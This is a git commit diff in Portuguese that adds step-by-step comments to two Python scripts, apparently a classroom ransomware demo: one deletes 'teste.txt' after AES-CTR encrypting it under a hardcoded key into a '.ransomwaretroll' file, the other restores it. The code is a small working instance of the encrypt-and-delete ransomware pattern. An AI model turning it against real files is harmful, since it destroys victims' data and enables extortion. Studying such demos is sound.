8d8dffc41307dcbee2a96cc969bdb65f0d331414
Adalberto Gonçalves da Silva <agsilva.mhm@gmail.com>
2024-12-29 08:30:41 -0300

    Implementação dos arquivos para criptografar e descriptografar

--- descriptografar.py
+++ descriptografar.py
@@ -1,23 +1,23 @@
-import os
-import pyaes
+# Importa os módulos necessários
+import os         # Módulo para manipulação de arquivos e sistema operacional
+import pyaes      # Biblioteca para criptografia/descriptografia AES
 
-## abrir o arquivo criptografado
-file_name = "teste.txt.ransomwaretroll"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Etapa 1: Abrir o arquivo criptografado
+file_name = "teste.txt.ransomwaretroll"  # Nome do arquivo criptografado
+file = open(file_name, "rb")            # Abre o arquivo no modo de leitura binária
+file_data = file.read()                 # Lê o conteúdo do arquivo criptografado
+file.close()                            # Fecha o arquivo após a leitura
 
-## chave para descriptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
-decrypt_data = aes.decrypt(file_data)
+# Etapa 2: Configurar a chave de descriptografia
+key = b"testeransomwares"               # Define a chave AES usada para descriptografia
+aes = pyaes.AESModeOfOperationCTR(key)  # Configura o AES no modo CTR com a chave
+decrypt_data = aes.decrypt(file_data)   # Descriptografa os dados do arquivo
 
-## remover o arquivo criptografado
-os.remove(file_name)
+# Etapa 3: Remover o arquivo criptografado
+os.remove(file_name)                    # Exclui o arquivo original criptografado
 
-## criar o arquivo descriptografado
-new_file = "teste.txt"
-new_file = open(f'{new_file}', "wb")
-new_file.write(decrypt_data)
-new_file.close()
-
+# Etapa 4: Criar um novo arquivo descriptografado
+new_file = "teste.txt"                  # Nome do novo arquivo descriptografado
+new_file = open(f'{new_file}', "wb")    # Abre (ou cria) o arquivo no modo de escrita binária
+new_file.write(decrypt_data)            # Escreve os dados descriptografados no novo arquivo
+new_file.close()                        # Fecha o novo arquivo após a escrita
--- encriptografar.py
+++ encriptografar.py
@@ -1,24 +1,25 @@
-import os
-import pyaes
+# Importa os módulos necessários
+import os         # Módulo para manipulação de arquivos e sistema operacional
+import pyaes      # Biblioteca para criptografia/descriptografia AES
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+# Etapa 1: Abrir o arquivo a ser criptografado
+file_name = "teste.txt"            # Nome do arquivo que será criptografado
+file = open(file_name, "rb")       # Abre o arquivo no modo de leitura binária
+file_data = file.read()            # Lê o conteúdo do arquivo e armazena em file_data
+file.close()                       # Fecha o arquivo após a leitura
 
-## remover o arquivo
-os.remove(file_name)
+# Etapa 2: Remover o arquivo original
+os.remove(file_name)               # Exclui o arquivo original para segurança
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+# Etapa 3: Configurar a chave de criptografia
+key = b"testeransomwares"          # Define a chave AES usada para criptografia
+aes = pyaes.AESModeOfOperationCTR(key)  # Configura o AES no modo CTR com a chave
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+# Etapa 4: Criptografar os dados do arquivo
+crypto_data = aes.encrypt(file_data)  # Criptografa os dados lidos do arquivo original
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+# Etapa 5: Salvar o arquivo criptografado
+new_file = file_name + ".ransomwaretroll"  # Define o nome do novo arquivo criptografado
+new_file = open(f'{new_file}', 'wb')      # Abre (ou cria) o arquivo no modo de escrita binária
+new_file.write(crypto_data)               # Escreve os dados criptografados no novo arquivo
+new_file.close()                          # Fecha o arquivo após a escrita
